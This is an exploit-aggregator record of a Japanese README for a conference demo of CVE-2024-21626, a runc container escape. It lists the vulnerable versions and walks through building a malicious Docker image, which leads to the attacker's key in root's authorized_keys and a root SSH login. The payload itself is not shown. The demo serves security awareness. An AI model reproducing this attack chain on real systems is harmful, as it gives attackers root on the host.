[
  {
    "source": "## https://sploitus.com/exploit?id=E221B02C-A1D6-5433-9A6A-F6B2ADD5FB22\n# CVE-2024-21626-demo\n\nContainer Runtime Meetup #5 のLT用のデモ。\n\n公知情報に則り攻撃の危険性を周知する目的であり、悪用は厳禁です。\n\n## スライド\n\n[Container Runtime Meetup #5 〜そのイメージ、本当に信頼できますか？〜 CVE-2024-21626 でホストのrootを奪取する](https://docs.google.com/presentation/d/e/2PACX-1vRkoysMWPYk633s3DxKL9liSkmuCOIffWtjqRl8ZWN5zs5L7VL8THMMLyPDhsDoTHrQuGyDM78ppXik/pub?start=false&loop=false&delayms=60000)\n\n## victim-server へのログイン\n\nデモ用laptopのssh_configに `victim-server` として登録しているマシン。\n\n```console\nssh victim-server\n```\n\n被害を受ける前提条件としてのバージョン情報:\n\n```console\nubuntu@victim-server:$ docker --version\nDocker version 20.10.25+dfsg1, build b82b9f3\n\nubuntu@victim-server:$ runc --version\nrunc version 1.1.10+ds1\ncommit: 1.1.10+ds1-1\nspec: 1.1.0\ngo: go1.21.3\nlibseccomp: 2.5.4\n```\n\n## attacker-server へのログイン\n\n同様に\n\n```console\nssh attacker-server\n```\n\n## シナリオ\n\n### 1. [victim-server] 悪意あるDockerイメージを誤って取得・ビルド・実行\n\n```console\nubuntu@victim-server:~$ git clone git@github.com:laysakura/CVE-2024-21626-demo.git\nubuntu@victim-server:~$ cd CVE-2024-21626-demo/\nubuntu@victim-server:~/CVE-2024-21626-demo$ docker build -t myimage .\nubuntu@victim-server:~/CVE-2024-21626-demo$ docker run -it myimage\n```\n\n### 2. [victim-server] 意図せぬうちに `/root/.ssh/authorized_keys` が攻撃者の公開鍵で書き換えられている\n\n本来は意図していないのでここでは何もしないが、状況確認のためのコマンドを示す。\n\n```console\nubuntu@victim-server:~$ sudo cat /root/.ssh/authorized_keys\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKPHHGSytV6bL1ryaEKE9XNWN23piXdzsI3Rzxe20IF6 ubuntu@attacker-server\n```\n\n### 3. [attacker-server] victim-server へのrootログイン\n\n```console\nattacker@attacker-server:~$ ssh -i .ssh/id_ed25519 root@victim-server\n\nroot@victim-server:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n## References\n\n- <https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv>\n- <https://github.com/NitroCao/CVE-2024-21626>",
    "id": "E221B02C-A1D6-5433-9A6A-F6B2ADD5FB22",
    "href": "https://github.com/laysakura/CVE-2024-21626-demo",
    "title": "Exploit for CVE-2024-21626"
  }
]
